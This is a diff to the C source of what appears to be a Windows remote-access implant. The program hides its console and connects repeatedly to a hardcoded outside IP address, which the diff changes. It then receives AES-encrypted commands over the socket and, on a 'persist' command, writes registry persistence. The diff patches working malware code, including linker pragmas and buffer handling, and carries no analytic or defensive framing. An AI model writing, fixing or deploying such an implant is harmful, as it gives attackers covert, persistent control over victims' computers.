@@ -1,6 +1,11 @@
 #ifndef WIN32_LEAN_AND_MEAN
 #define WIN32_LEAN_AND_MEAN
 #endif
+#ifndef _CRT_SECURE_NO_WARNINGS
+#define _CRT_SECURE_NO_WARNINGS
+#endif
+
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
 
 #include <windows.h>
 #include <winsock2.h>
@@ -15,11 +20,7 @@
 #include <openssl/ssl.h>
 #include <openssl/applink.c>
 
-
- //#pragma comment (lib, "Ws2_32.lib")
- //#pragma comment (lib, "libcrypto.lib")
- //#pragma comment(lib, "user32.lib")
- //#pragma comment(lib, "advapi32.lib")
+#pragma comment (lib, "Ws2_32.lib")
 
 #define SVPORT 8008
 #define CLPORT 8009
@@ -168,6 +169,7 @@ void PERSIST()
     RegCloseKey(hKey);
 }
 
+//APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lCmdLine, int nCmdShow)
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lCmdLine, int nCmdShow)
 {
     HWND hWindow = GetConsoleWindow();
@@ -182,21 +184,21 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lCmdLin
         return 1;
     }
     FreeConsole();
-
+    
     //SOCKET CONNECTOR
     WSADATA wsaData;
 
-    char serverIP[] = "180.129.75.136";
+    char serverIP[] = "138.75.195.115";
     int serverPort = SVPORT;
 
     WSAStartup(MAKEWORD(2, 2), &wsaData);
     SOCKET sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-
+    printf("dasd");
     struct sockaddr_in serverInfo;
     serverInfo.sin_family = AF_INET;
     serverInfo.sin_addr.s_addr = inet_addr(serverIP);
     serverInfo.sin_port = htons(serverPort);
-
+    printf("Connecting\n");
 
     while (connect(sockfd, (SOCKADDR*)&serverInfo, sizeof(serverInfo)) != 0)
     {
@@ -228,7 +230,9 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lCmdLin
         recv(sockfd, (char*)recvAESText, recvAESTextLen, 0);
         //m
         unsigned char iv[EVP_MAX_IV_LENGTH];
-        unsigned char aesCiphertext[aesCiphertextLen];
+
+        //unsigned char aesCiphertext[aesCiphertextLen];
+        unsigned char* aesCiphertext = malloc(aesCiphertextLen);
         memcpy(aesCiphertext, recvAESText, aesCiphertextLen);
         memcpy(iv, recvAESText + aesCiphertextLen, EVP_MAX_IV_LENGTH);
 
@@ -236,6 +240,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lCmdLin
         int aesPlaintextLen = decryptAES(aesCiphertext, aesCiphertextLen, aes_key, iv, &aesPlaintext);
         aesPlaintext[aesPlaintextLen] = '\0';
 
+        free(aesCiphertext);
         if (strncmp(aesPlaintext, "persist", strlen("persist") == 0))
         {
             PERSIST();
